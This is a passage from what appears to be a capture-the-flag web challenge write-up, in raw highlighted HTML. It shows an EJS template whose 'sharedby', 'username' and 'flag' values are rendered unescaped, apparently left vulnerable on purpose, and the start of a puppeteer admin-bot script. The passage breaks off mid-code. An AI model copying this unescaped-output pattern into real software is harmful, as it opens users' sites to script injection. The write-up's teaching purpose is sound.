class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">link\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">rel\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"stylesheet\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/static/style.css\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">body\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">class\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"container\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">h2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Hello \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">%- username %>!&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">h2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Enter your text below, and we will make it fancy!&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">form\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">action\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/view\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">method\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"get\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">input\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">type\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"text\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">name\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"content\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">placeholder\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Enter your text here\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">required\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">br\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">br\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">button\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">type\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"submit\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Submit&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">button\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">form\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">br\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% if (flag) { %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Oh? You seem to have a flag! You can view it &#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view?content=\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">%- flag %>\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>here&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>!&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% } %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% if (username !=='GUEST' ) { %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Do you like this site? Share it to a friend! &#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">button\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">id\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"shareButton\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>Share&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">button\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">script\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">window.\u003C/span>\u003Cspan style=\"--0:#B392F0\">onload\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> () \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                        \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sharingUrl \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">URL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(window.location.href);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                        \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">usernameCookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> document.cookie.\u003C/span>\u003Cspan style=\"--0:#B392F0\">split\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'; '\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).\u003C/span>\u003Cspan style=\"--0:#B392F0\">find\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">cookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> cookie.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'username='\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (usernameCookie) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                            \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">usernameValue\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> usernameCookie.\u003C/span>\u003Cspan style=\"--0:#B392F0\">split\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'='\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">sharingUrl.searchParams.\u003C/span>\u003Cspan style=\"--0:#B392F0\">append\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'sharedby'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, usernameValue);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">document.\u003C/span>\u003Cspan style=\"--0:#B392F0\">getElementById\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'shareButton'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).\u003C/span>\u003Cspan style=\"--0:#B392F0\">addEventListener\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'click'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, () \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">navigator.\u003C/span>\u003Cspan style=\"--0:#B392F0\">share\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">({\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">title: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Fancy Text Viewer'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">text: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Check out this fancy text viewer!'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url: sharingUrl\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">})\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">script\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% } %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">br\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">body\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003C!DOCTYPE html>\u003Chtml lang=&#x22;en&#x22;>\u003Chead>    \u003Cmeta charset=&#x22;UTF-8&#x22;>    \u003Cmeta name=&#x22;viewport&#x22; content=&#x22;width=device-width, initial-scale=1.0&#x22;>    \u003Ctitle>        Fancy Text Viewer        \u003C% if (sharedby) { %>            | Shared by \u003C%- sharedby %>        \u003C% } %>    \u003C/title>    \u003C!DOCTYPE html>    \u003Chtml>    \u003Chead>        \u003Clink rel=&#x22;stylesheet&#x22; href=&#x22;/static/style.css&#x22;>    \u003C/head>\u003C/head>\u003Cbody>    \u003Cdiv class=&#x22;container&#x22;>        \u003Ch2>Hello \u003C%- username %>!\u003C/h2>        \u003Cp>Enter your text below, and we will make it fancy!\u003C/p>        \u003Cform action=&#x22;/view&#x22; method=&#x22;get&#x22;>            \u003Cinput type=&#x22;text&#x22; name=&#x22;content&#x22; placeholder=&#x22;Enter your text here&#x22; required>            \u003Cbr>            \u003Cbr>            \u003Cbutton type=&#x22;submit&#x22;>Submit\u003C/button>        \u003C/form>        \u003Cbr>        \u003C% if (flag) { %>            \u003Cp>Oh? You seem to have a flag! You can view it \u003Ca href=&#x22;view?content=\u003C%- flag %>&#x22;>here\u003C/a>!\u003C/p>        \u003C% } %>        \u003C% if (username !==&#x27;GUEST&#x27; ) { %>            \u003Cdiv>                \u003Cp>Do you like this site? Share it to a friend! \u003C/p>                \u003Cbutton id=&#x22;shareButton&#x22;>Share\u003C/button>                \u003Cscript>                    window.onload = () => {                        let sharingUrl = new URL(window.location.href);                        const usernameCookie = document.cookie.split(&#x27;; &#x27;).find(cookie => cookie.startsWith(&#x27;username=&#x27;));                        if (usernameCookie) {                            const usernameValue = usernameCookie.split(&#x27;=&#x27;)[1];                            sharingUrl.searchParams.append(&#x27;sharedby&#x27;, usernameValue);                        }                        document.getElementById(&#x27;shareButton&#x27;).addEventListener(&#x27;click&#x27;, () => {                            navigator.share({                                title: &#x27;Fancy Text Viewer&#x27;,                                text: &#x27;Check out this fancy text viewer!&#x27;,                                url: sharingUrl                            })                        });                    }                \u003C/script>            \u003C/div>        \u003C% } %>    \u003C/div>    \u003Cbr>\u003C/body>\u003C/html>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We can further notice the bot.js file, which does the following:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> puppeteer \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"puppeteer\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sleep\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">milliseconds\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">Promise\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">resolve\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">setTimeout\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resolve, milliseconds));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CHALL_URL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"http://127.0.0.1:4444\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">export\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">default\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">async\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">bot_goto\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan 